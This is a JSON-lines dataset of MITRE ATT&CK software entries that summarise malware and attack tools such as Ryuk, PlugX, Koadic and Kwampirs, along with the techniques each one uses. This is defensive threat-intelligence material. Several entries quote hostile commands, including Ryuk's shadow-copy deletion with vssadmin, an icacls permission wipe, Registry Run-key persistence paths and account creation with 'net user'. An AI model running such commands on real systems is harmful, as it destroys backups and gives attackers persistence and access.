{"text": " The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility) [Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.", "idx": "https://attack.mitre.org/software/S0039", "title": "Net", "entity": "Net", "entity_type": "software", "entity_context": ["Commands such as <code>net group</code> and <code>net localgroup</code> can be used in Net to gather information about and manipulate groups.", "The <code>net start</code> and <code>net stop</code> commands can be used in Net to execute or stop Windows services.", "Commands such as <code>net group /domain</code> can be used in Net to gather information about and manipulate groups.", "Commands such as <code>net view</code> can be used in Net to gather information about available remote systems.", "The <code>net time</code> command can be used in Net to determine the local or remote system time.", "The <code>net user username \\password \\domain</code> commands in Net can be used to create a domain account.", "The <code>net use \\\\system\\share /delete</code> command can be used in Net to remove an established connection to a network share.", "Lateral movement can be done with Net through <code>net use</code> commands to connect to the on remote systems.", "Commands under <code>net user</code> can be used in Net to gather information about and manipulate user accounts.", "Commands such as <code>net use</code> and <code>net session</code> can be used in Net to gather information about network connections from a particular host.", "The <code>net user username \\password</code> commands in Net can be used to create a local account.", "The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in Net can be used to find shared drives and directories on remote and local systems respectively.", "Net commands used with the <code>/domain</code> flag can be used to gather information about and manipulate user accounts on the current domain.", "The <code>net accounts</code> and <code>net accounts /domain</code> commands with Net can be used to obtain password policy information.", "The <code>net start</code> command can be used in Net to find information about Windows services."], "is_subtechnique": false}
{"text": " [Ryuk](https://attack.mitre.org/software/S0446) is a ransomware designed to target enterprise environments that has been used in attacks since at least 2018. [Ryuk](https://attack.mitre.org/software/S0446) shares code similarities with Hermes ransomware.(Citation: CrowdStrike Ryuk January 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: FireEye FIN6 Apr 2019)", "idx": "https://attack.mitre.org/software/S0446", "title": "Ryuk", "entity": "Ryuk", "entity_type": "software", "entity_context": ["Ryuk has injected itself into remote processes to encrypt files using a combination of <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code>.", "Ryuk has used <code>cmd.exe</code> to create a Registry entry to establish persistence.", "Ryuk can use stolen domain admin accounts to move laterally within a victim domain.", "Ryuk can launch <code>icacls <path> /grant Everyone:F /T /C /Q</code> to delete every access-based restrictions on files and directories.", "Ryuk has called <code>GetIpNetTable</code> in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries. ", "Ryuk has used the Windows command line to create a Registry entry under <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence.", "Ryuk has called <code>CreateToolhelp32Snapshot</code> to enumerate all running processes.", "Ryuk has constructed legitimate appearing installation folder paths by calling <code>GetWindowsDirectoryW</code> and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as <code>C:\\Users\\Public</code>.", "Ryuk has stopped services related to anti-virus.", "Ryuk can create .dll files that actually contain a Rich Text File format document.", "Ryuk has called <code>GetLogicalDrives</code> to emumerate all mounted drives, and <code>GetDriveTypeW</code> to determine the drive type.", "Ryuk has been observed to query the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> and the value <code>InstallLanguage</code>. If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution.", "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement.", "Ryuk has called <code>kill.bat</code> for stopping services, disabling services and killing processes.", "Ryuk can use anti-disassembly and code transformation obfuscation techniques.", "Ryuk has used <code>vssadmin Delete Shadows /all /quiet</code> to to delete volume shadow copies and <code>vssadmin resize shadowstorage</code> to force deletion of shadow copies created by third-party applications.", "Ryuk has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.", "Ryuk has used multiple native APIs including <code>ShellExecuteW</code> to run executables,<code>GetWindowsDirectoryW</code> to create folders, and <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> for process injection.", "Ryuk has used the C$ network share for lateral movement.", "Ryuk has attempted to adjust its token privileges to have the <code>SeDebugPrivilege</code>.", "Ryuk can remotely create a scheduled task to execute itself on a system."], "is_subtechnique": false}
{"text": " [Conficker](https://attack.mitre.org/software/S0608) is a computer worm first detected in October 2008 that targeted Microsoft Windows using the MS08-067 Windows vulnerability to spread.(Citation: SANS Conficker) In 2016, a variant of [Conficker](https://attack.mitre.org/software/S0608) made its way on computers and removable disk drives belonging to a nuclear power plant.(Citation: Conficker Nuclear Power Plant)", "idx": "https://attack.mitre.org/software/S0608", "title": "Conficker", "entity": "Conficker", "entity_type": "software", "entity_context": ["Conficker has used a DGA that seeds with the current UTC victim system date to generate domains.", "Conficker terminates various services related to system security and Windows.", "Conficker has obfuscated its code to prevent its removal from host machines.", "Conficker resets system restore points and deletes backup files.", "Conficker variants spread through NetBIOS share propagation.", "Conficker adds Registry Run keys to establish persistence.", "Conficker adds keys to the Registry at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services</code> and various other Registry locations.", "Conficker variants used the Windows AUTORUN feature to spread through USB propagation.", "Conficker exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.", "Conficker uses the current UTC victim system date for domain generation and connects to time servers to determine the current date.", "Conficker scans for other machines to infect.", "Conficker copies itself into the <code>%systemroot%\\system32</code> directory and registers as a service.", "Conficker downloads an HTTP server to the infected machine."], "is_subtechnique": false}
{"text": " [Vasport](https://attack.mitre.org/software/S0207) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Vasport May 2012)", "idx": "https://attack.mitre.org/software/S0207", "title": "Vasport", "entity": "Vasport", "entity_type": "software", "entity_context": ["Vasport can download files.", "Vasport is capable of tunneling though a proxy.", "Vasport copies itself to disk and creates an associated run key Registry entry to establish.", "Vasport creates a backdoor by making a connection using a HTTP POST."], "is_subtechnique": false}
{"text": " [Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool. [Koadic](https://attack.mitre.org/software/S0250) is publicly available on GitHub and the tool is executed via the command-line. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants. [Koadic](https://attack.mitre.org/software/S0250) performs most of its operations using Windows Script Host. (Citation: Github Koadic) (Citation: Palo Alto Sofacy 06-2018)", "idx": "https://attack.mitre.org/software/S0250", "title": "Koadic", "entity": "Koadic", "entity_type": "software", "entity_context": ["Koadic can enable remote desktop on the victim's machine.", "Koadic can retrieve information about the Windows domain.", "Koadic can identify logged in users across the domain and views user sessions.", "Koadic can use SSL and TLS for communications.", "Koadic can use MSHTA to serve additional payloads.", "Koadic can use Regsvr32 to execute additional payloads.", "Koadic can retrieve the current content of the user clipboard.", "Koadic can use WMI to execute commands.", "Koadic can open an interactive command-shell to perform command line functions on victim machines. Koadic performs most of its operations using Windows Script Host (Jscript) and runs arbitrary shellcode .", "Koadic can gather hashed passwords by dumping SAM/SECURITY hive.", "Koadic has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe.", "Koadic can scan for open TCP ports on the target network.", "Koadic can gather hashed passwords by gathering domain controller hashes from NTDS.", "Koadic can run a command on another machine using PsExec.", "Koadic can scan local network for open SMB.", "Koadic performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .", "Koadic can perform process injection by using a reflective DLL.", "Koadic can download files off the target system to send back to the server.", "Koadic can use Rundll32 to execute additional payloads.", "Koadic can download additional files."], "is_subtechnique": false}
{"text": " [SLOWDRIFT](https://attack.mitre.org/software/S0218) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) against academic and strategic victims in South Korea. (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0218", "title": "SLOWDRIFT", "entity": "SLOWDRIFT", "entity_type": "software", "entity_context": ["SLOWDRIFT downloads additional payloads.", "SLOWDRIFT collects and sends system information to its C2.", "SLOWDRIFT uses cloud based services for C2."], "is_subtechnique": false}
{"text": " [WEBC2](https://attack.mitre.org/software/S0109) is a family of backdoor malware used by [APT1](https://attack.mitre.org/groups/G0006) as early as July 2006. [WEBC2](https://attack.mitre.org/software/S0109) backdoors are designed to retrieve a webpage, with commands hidden in HTML comments or special tags, from a predetermined C2 server. (Citation: Mandiant APT1 Appendix)(Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0109", "title": "WEBC2", "entity": "WEBC2", "entity_type": "software", "entity_context": ["WEBC2 can open an interactive command shell.", "WEBC2 can download and execute a file.", "Variants of WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to <code>%SYSTEMROOT%</code> (<code>C:\\WINDOWS\\ntshrui.dll</code>)."], "is_subtechnique": false}
{"text": " [Helminth](https://attack.mitre.org/software/S0170) is a backdoor that has at least two variants - one written in VBScript and PowerShell that is delivered via a macros in Excel spreadsheets, and one that is a standalone Windows executable. (Citation: Palo Alto OilRig May 2016)", "idx": "https://attack.mitre.org/software/S0170", "title": "Helminth", "entity": "Helminth", "entity_type": "software", "entity_context": ["Helminth splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.", "Helminth can provide a remote shell. One version of Helminth uses batch scripting.", "Helminth creates folders to store output from batch scripts prior to sending the information to its C2 server.", "One version of Helminth uses a PowerShell script.", "The Helminth config file is encrypted with RC4.", "The executable version of Helminth has a module to log keystrokes.", "Helminth encrypts data sent to its C2 server over HTTP with RC4.", "The executable version of Helminth has a module to log clipboard contents.", "Helminth establishes persistence by creating a shortcut.", "Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.", "Helminth can use DNS for C2.", "Helminth has used a scheduled task for persistence.", "Helminth establishes persistence by creating a shortcut in the Start Menu folder.", "Helminth can download additional files.", "For C2 over HTTP, Helminth encodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS, Helminth converts ASCII characters into their hexadecimal values and sends the data in cleartext.", "Helminth has checked the local administrators group.", "One version of Helminth consists of VBScript scripts.", "Helminth has used Tasklist to get information on processes.", "Helminth has checked for the domain admin group and Exchange Trusted Subsystem groups using the commands <code>net group Exchange Trusted Subsystem /domain</code> and <code>net group domain admins /domain</code>.", "Helminth can use HTTP for C2.", "A Helminth VBScript receives a batch script to execute a set of commands in a command prompt."], "is_subtechnique": false}
{"text": " [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) that uses modular plugins. It has been used by multiple threat groups. (Citation: Lastline PlugX Analysis) (Citation: FireEye Clandestine Fox Part 2) (Citation: New DragonOK) (Citation: Dell TG-3390)", "idx": "https://attack.mitre.org/software/S0013", "title": "PlugX", "entity": "PlugX", "entity_type": "software", "entity_context": ["PlugX has beaconed to its C2 over port 443.", "In one instance, menuPass added PlugX as a service with a display name of \"Corel Writing Tools Utility.\"", "PlugX can enumerate and query for information contained within the Windows Registry.", "PlugX has a module to create, delete, or modify Registry keys.", "PlugX checks if VMware tools is running in the background by searching for any process named \"vmtoolsd\". ", "PlugX can be configured to use multiple network protocols to avoid network-based detection.", "PlugX has a module to enumerate drives and find files recursively.", "PlugX has used DLL side-loading to evade anti-virus.", "PlugX can be configured to use DNS for command and control.", "PlugX can be configured to use HTTP for command and control.", "PlugX has a module to enumerate network shares.", "PlugX can be configured to use raw TCP or UDP for command and control.", "PlugX uses Pastebin to store C2 addresses.", "PlugX can be added as a service to establish persistence. PlugX also has a module to change service configurations as well as start, control, and delete services.", "A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques.", "PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.", "PlugX has a module to download and execute files on the compromised machine.", "PlugX allows the operator to capture screenshots.", "PlugX has a module to list the processes running on a machine.", "PlugX allows actors to spawn a reverse shell on a victim.", "PlugX has a module for capturing keystrokes per process including window titles.", "PlugX has a module for enumerating TCP and UDP network connections and associated processes using the <code>netstat</code> command.", "PlugX can use the Windows API function CreateProcess to execute another process.", "PlugX adds Run key entries in the Registry to establish persistence."], "is_subtechnique": false}
{"text": " [Power Loader](https://attack.mitre.org/software/S0177) is modular code sold in the cybercrime market used as a downloader in malware families such as Carberp, Redyms and Gapz. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)", "idx": "https://attack.mitre.org/software/S0177", "title": "Power Loader", "entity": "Power Loader", "entity_type": "software", "entity_context": ["Power Loader overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe."], "is_subtechnique": false}
{"text": " [Psylo](https://attack.mitre.org/software/S0078) is a shellcode-based Trojan that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). It has similar characteristics as [FakeM](https://attack.mitre.org/software/S0076). (Citation: Scarlet Mimic Jan 2016)", "idx": "https://attack.mitre.org/software/S0078", "title": "Psylo", "entity": "Psylo", "entity_type": "software", "entity_context": ["Psylo has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.", "Psylo uses HTTPS for C2.", "Psylo has commands to enumerate all storage devices and to find all files that start with a particular string.", "Psylo exfiltrates data to its C2 server over the same protocol as C2 communications.", "Psylo has a command to download a file to the system from its C2 server."], "is_subtechnique": false}
{"text": " [netstat](https://attack.mitre.org/software/S0104) is an operating system utility that displays active TCP connections, listening ports, and network statistics. (Citation: TechNet Netstat)", "idx": "https://attack.mitre.org/software/S0104", "title": "netstat", "entity": "netstat", "entity_type": "software", "entity_context": ["netstat can be used to enumerate local network connections, including active TCP connections and other network statistics."], "is_subtechnique": false}
{"text": " [NanoCore](https://attack.mitre.org/software/S0336) is a modular remote access tool developed in .NET that can be used to spy on victims and steal information. It has been used by threat actors since 2013.(Citation: DigiTrust NanoCore Jan 2017)(Citation: Cofense NanoCore Mar 2018)(Citation: PaloAlto NanoCore Feb 2016)(Citation: Unit 42 Gorgon Group Aug 2018)", "idx": "https://attack.mitre.org/software/S0336", "title": "NanoCore", "entity": "NanoCore", "entity_type": "software", "entity_context": ["NanoCore uses DES to encrypt the C2 traffic.", "NanoCore can perform keylogging on the victim’s machine.", "NanoCore’s plugins were obfuscated with Eazfuscater.NET 3.3.", "NanoCore creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.", "NanoCore can capture audio feeds from the system.", "NanoCore has the capability to edit the Registry.", "NanoCore can modify the victim's firewall.", "NanoCore uses VBS files.", "NanoCore can modify the victim's anti-virus.", "NanoCore has the capability to download and activate additional modules for execution.", "NanoCore can open a remote command-line interface and execute commands. NanoCore uses JavaScript files.", "NanoCore can access the victim's webcam and capture data.", "NanoCore gathers the IP address from the victim’s machine."], "is_subtechnique": false}
{"text": " [H1N1](https://attack.mitre.org/software/S0132) is a malware variant that has been distributed via a campaign using VBA macros to infect victims. Although it initially had only loader capabilities, it has evolved to include information-stealing functionality. (Citation: Cisco H1N1 Part 1)", "idx": "https://attack.mitre.org/software/S0132", "title": "H1N1", "entity": "H1N1", "entity_type": "software", "entity_context": ["H1N1 has functionality to copy itself to network shares.", "H1N1 obfuscates C2 traffic with an altered version of base64.", "H1N1 uses a custom packing algorithm.", "H1N1 kills and disables services for Windows Security Center, and Windows Defender.", "H1N1 has functionality to copy itself to removable media.", "H1N1 uses multiple techniques to obfuscate strings, including XOR.", "H1N1 disable recovery options and deletes shadow copies from the victim.", "H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).", "H1N1 encrypts C2 traffic using an RC4 key.", "H1N1 dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.", "H1N1 kills and disables services by using cmd.exe.", "H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.", "H1N1 kills and disables services for Windows Firewall."], "is_subtechnique": false}
{"text": " [HDoor](https://attack.mitre.org/software/S0061) is malware that has been customized and used by the [Naikon](https://attack.mitre.org/groups/G0019) group. (Citation: Baumgartner Naikon 2015)", "idx": "https://attack.mitre.org/software/S0061", "title": "HDoor", "entity": "HDoor", "entity_type": "software", "entity_context": ["HDoor scans to identify open ports on the victim.", "HDoor kills anti-virus found on the victim."], "is_subtechnique": false}
{"text": " [Penquin](https://attack.mitre.org/software/S0587) is a remote access trojan (RAT) with multiple versions used by [Turla](https://attack.mitre.org/groups/G0010) to target Linux systems since at least 2014.(Citation: Kaspersky Turla Penquin December 2014)(Citation: Leonardo Turla Penquin May 2020)", "idx": "https://attack.mitre.org/software/S0587", "title": "Penquin", "entity": "Penquin", "entity_type": "software", "entity_context": ["Penquin can execute the command code <code>do_upload</code> to send files to C2.", "Penquin can execute the command code <code>do_download</code> to retrieve remote files from C2.", "Penquin can report the file system type and disk space of a compromised host to C2.", "Penquin can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.", "The Penquin C2 mechanism is based on TCP and UDP packets.", "Penquin has mimicked the Cron binary to hide itself on compromised systems.", "Penquin can sniff network traffic to look for packets matching specific conditions.", "Penquin can remove strings from binaries.", "Penquin can delete downloaded executables after running them.", "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions.", "Penquin has encrypted strings in the binary for obfuscation.", "Penquin can add the executable flag to a downloaded file.", "Penquin can report the IP of the compromised host to attacker controlled infrastructure.", "Penquin can use the command code <code>do_vslist</code> to send file names, size, and status to C2.", "Penquin can use Cron to create periodic and pre-scheduled background jobs.", "Penquin can execute remote commands using bash scripts."], "is_subtechnique": false}
{"text": " [Misdat](https://attack.mitre.org/software/S0083) is a backdoor that was used by [Dust Storm](https://attack.mitre.org/groups/G0031) from 2010 to 2011. (Citation: Cylance Dust Storm)", "idx": "https://attack.mitre.org/software/S0083", "title": "Misdat", "entity": "Misdat", "entity_type": "software", "entity_context": ["Many Misdat samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.", "Misdat is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.", "Misdat network traffic communicates over common ports like 80, 443, or 1433.", "Misdat is capable of providing shell functionality to the attacker to execute commands.", "Misdat saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.", "Misdat network traffic communicates over a raw socket.", "Misdat is capable of downloading files from the C2.", "Misdat is capable of deleting the backdoor file.", "The initial beacon packet for Misdat contains the operating system version of the victim.", "Misdat network traffic is Base64-encoded plaintext.", "Misdat is capable of deleting Registry keys used for persistence."], "is_subtechnique": false}
{"text": " [Bisonal](https://attack.mitre.org/software/S0268) is malware that has been used in attacks against targets in Russia, South Korea, and Japan. It has been observed in the wild since 2014.(Citation: Unit 42 Bisonal July 2018)", "idx": "https://attack.mitre.org/software/S0268", "title": "Bisonal", "entity": "Bisonal", "entity_type": "software", "entity_context": ["Bisonal can obtain a list of running processes on the victim’s machine.", "Bisonal uses 443 for C2 communications.", "Bisonal uses HTTP for C2 communications.", "Bisonal deletes its dropper and VBS scripts from the victim’s machine.", "Bisonal's DLL file and non-malicious decoy file are encrypted with RC4.", "Bisonal uses rundll32.exe to execute as part of the Registry Run key it adds: <code>HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”</code>.", "Bisonal has the capability to download files to execute on the victim’s machine.", "Bisonal checks if the malware was executed within a VMware environment.", "Bisonal can launch cmd.exe to execute commands on the system.", "Bisonal adds itself to the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\</code> for persistence.", "Bisonal has encoded binary data with Base64.", "Bisonal has a command to gather system information from the victim’s machine.", "Bisonal can retrieve a file list of a specified folder.", "Bisonal variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some Bisonal samples encrypt C2 communications with RC4.", "Bisonal can execute <code>ipconfig</code> on the victim’s machine.", "Bisonal decodes strings in the malware using XOR and RC4.", "Bisonal's dropper creates VBS scripts on the victim’s machine.", "Bisonal can check the system time set on the infected host."], "is_subtechnique": false}
{"text": " [Kwampirs](https://attack.mitre.org/software/S0236) is a backdoor Trojan used by [Orangeworm](https://attack.mitre.org/groups/G0071). It has been found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines. (Citation: Symantec Orangeworm April 2018)", "idx": "https://attack.mitre.org/software/S0236", "title": "Kwampirs", "entity": "Kwampirs", "entity_type": "software", "entity_context": ["Kwampirs collects a list of active and listening connections by using the command <code>netstat -nao</code> as well as a list of available network mappings with <code>net use</code>.", "Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.", "Kwampirs collects password policy information with the command <code>net accounts</code>.", "Kwampirs establishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service.", "Before writing to disk, Kwampirs inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.", "Kwampirs collects a list of accounts with the command <code>net users</code>.", "Kwampirs collects a list of files and directories in C:\\ with the command <code>dir /s /a c:\\ >> \"C:\\windows\\TEMP\\RANDOM.tmp\"</code>.", "Kwampirs collects a list of users belonging to the local users and administrators groups with the commands <code>net localgroup administrators</code> and <code>net localgroup users</code>.", "Kwampirs downloads additional files from C2 servers.", "Kwampirs collects a list of running services with the command <code>tasklist /svc</code>.", "Kwampirs uses a large list of C2 servers that it cycles through until a successful connection is established.", "Kwampirs collects registered owner details by using the commands <code>systeminfo</code> and <code>net config workstation</code>.", "Kwampirs copies itself over network shares to move laterally on a victim network.", "Kwampirs collects network adapter and interface information by using the commands <code>ipconfig /all</code>, <code>arp -a</code> and <code>route print</code>. It also collects the system's MAC address with <code>getmac</code> and domain configuration with <code>net config workstation</code>.", "Kwampirs creates a new service named WmiApSrvEx to establish persistence.", "Kwampirs decrypts and extracts a copy of its main DLL payload when executing.", "Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands <code>systeminfo</code>, <code>net config workstation</code>, <code>hostname</code>, <code>ver</code>, <code>set</code>, and <code>date /t</code>.", "Kwampirs uses rundll32.exe in a Registry value added to establish persistence.", "Kwampirs collects a list of network shares with the command <code>net share</code>.", "Kwampirs collects a list of available servers with the command <code>net view</code>.", "Kwampirs collects a list of running services with the command <code>tasklist /v</code>.", "Kwampirs collects a list of domain groups with the command <code>net localgroup /domain</code>."], "is_subtechnique": false}
{"text": " [RunningRAT](https://attack.mitre.org/software/S0253) is a remote access tool that appeared in operations surrounding the 2018 Pyeongchang Winter Olympics along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [Brave Prince](https://attack.mitre.org/software/S0252). (Citation: McAfee Gold Dragon)", "idx": "https://attack.mitre.org/software/S0253", "title": "RunningRAT", "entity": "RunningRAT", "entity_type": "software", "entity_context": ["RunningRAT captures keystrokes and sends them back to the C2 server.", "RunningRAT kills antimalware running process.", "RunningRAT contains code to clear event logs.", "RunningRAT adds itself to the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence upon reboot.", "RunningRAT contains code to compress files.", "RunningRAT contains code to delete files from the victim’s machine.", "RunningRAT gathers the OS version, logical drives information, processor information, and volume information.", "RunningRAT uses a batch file to kill a security program task and then attempts to remove itself.", "RunningRAT contains code to open and copy data from the clipboard."], "is_subtechnique": false}
{"text": " [CHOPSTICK](https://attack.mitre.org/software/S0023) is a malware family of modular backdoors used by [APT28](https://attack.mitre.org/groups/G0007). It has been used since at least 2012 and is usually dropped on victims as second-stage malware, though it has been used as first-stage malware in several cases. It has both Windows and Linux variants. (Citation: FireEye APT28) (Citation: ESET Sednit Part 2) (Citation: FireEye APT28 January 2017) (Citation: DOJ GRU Indictment Jul 2018) It is tracked separately from the [X-Agent for Android](https://attack.mitre.org/software/S0314).", "idx": "https://attack.mitre.org/software/S0023", "title": "CHOPSTICK", "entity": "CHOPSTICK", "entity_type": "software", "entity_context": ["CHOPSTICK may store RC4 encrypted configuration information in the Windows Registry.", "CHOPSTICK is capable of performing remote command execution.", "CHOPSTICK is capable of performing keylogging.", "CHOPSTICK used a proxy server between victims and the C2 server.", "Various implementations of CHOPSTICK communicate with C2 over SMTP and POP3.", "CHOPSTICK can use a DGA for Fallback Channels, domains are generated by concatenating words from lists.", "CHOPSTICK is capable of performing remote file transmission.", "CHOPSTICK checks for antivirus and forensics software.", "CHOPSTICK can switch to a new C2 channel if the current one is broken.", "CHOPSTICK encrypts C2 communications with TLS.", "Various implementations of CHOPSTICK communicate with C2 over HTTP.", "CHOPSTICK  includes runtime checks to identify an analysis environment and prevent execution on it.", "CHOPSTICK provides access to the Windows Registry, which can be used to gather information.", "CHOPSTICK has the capability to capture screenshots.", "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.", "An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.", "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.", "CHOPSTICK encrypts C2 communications with RC4."], "is_subtechnique": false}
{"text": " [Sliver](https://attack.mitre.org/software/S0633) is an open source, cross-platform, red team command and control framework written in Golang.(Citation: Bishop Fox Sliver Framework August 2019)", "idx": "https://attack.mitre.org/software/S0633", "title": "Sliver", "entity": "Sliver", "entity_type": "software", "entity_context": ["Sliver has the ability to manipulate user tokens on targeted Windows systems.", "Sliver can collect network connection information.", "Sliver has the ability to gather network configuration information.", "Sliver can enumerate files on a target system.", "Sliver can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.", " Sliver has the ability to support C2 communications over HTTP/S.", "Sliver can inject code into local and remote processes.", "Sliver can take screenshots of the victim’s active display.", "Sliver can encrypt strings at compile time.", "Sliver can support C2 communications over DNS.", "Sliver can upload files from the C2 server to the victim machine using the <code>upload</code> command.", "Sliver can use mutual TLS and RSA  cryptography to exchange a session key.", "Sliver can use AES-GCM-256 to encrypt a session key for C2 message exchange.", "Sliver can encode binary data into a .PNG file for C2 communication.", "Sliver can exfiltrate files from the victim using the <code>download</code> command."], "is_subtechnique": false}
{"text": " [More_eggs](https://attack.mitre.org/software/S0284) is a JScript backdoor used by [Cobalt Group](https://attack.mitre.org/groups/G0080) and [FIN6](https://attack.mitre.org/groups/G0037). Its name was given based on the variable \"More_eggs\" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. (Citation: Talos Cobalt Group July 2018)(Citation: Security Intelligence More Eggs Aug 2019)", "idx": "https://attack.mitre.org/software/S0284", "title": "More_eggs", "entity": "More_eggs", "entity_type": "software", "entity_context": ["More_eggs has the capability to gather the IP address from the victim's machine.", "More_eggs has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.", "More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end.", "More_eggs has used HTTP GET requests to check internet connectivity.", "More_eggs has used cmd.exe for execution.", "More_eggs has used basE91 encoding, along with encryption, for C2 communication.", "More_eggs has the capability to gather the username from the victim's machine.", "More_eggs will decode malware components that are then dropped to the system.", "More_eggs uses HTTPS for C2.", "More_eggs has used regsvr32.exe to execute the malicious DLL.", "More_eggs can remove itself from a system.", "More_eggs can obtain information on installed anti-malware programs.", "More_eggs can download and launch additional payloads.", "More_eggs has the capability to gather the OS version and computer name.", "More_eggs has used an RC4-based encryption method for its C2 communications."], "is_subtechnique": false}
{"text": " [GLOOXMAIL](https://attack.mitre.org/software/S0026) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Jabber/XMPP traffic. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0026", "title": "GLOOXMAIL", "entity": "GLOOXMAIL", "entity_type": "software", "entity_context": ["GLOOXMAIL communicates to servers operated by Google using the Jabber/XMPP protocol."], "is_subtechnique": false}
{"text": " [zwShell](https://attack.mitre.org/software/S0350) is a remote access tool (RAT) written in Delphi that has been used by [Night Dragon](https://attack.mitre.org/groups/G0014).(Citation: McAfee Night Dragon)", "idx": "https://attack.mitre.org/software/S0350", "title": "zwShell", "entity": "zwShell", "entity_type": "software", "entity_context": ["zwShell has established persistence by adding itself as a new service.", "zwShell can obtain the victim PC name and OS version.", "zwShell can launch command-line shells.", "zwShell has deleted itself after creating a service as well as deleted a temporary file when the system reboots.", "zwShell has used RDP for lateral movement.", "zwShell can browse the file system.", "zwShell has used SchTasks for execution.", "zwShell can obtain the victim IP address.", "zwShell has been copied over network shares to move laterally.", "zwShell can obtain the name of the logged-in user on the victim.", "zwShell can modify the Registry."], "is_subtechnique": false}
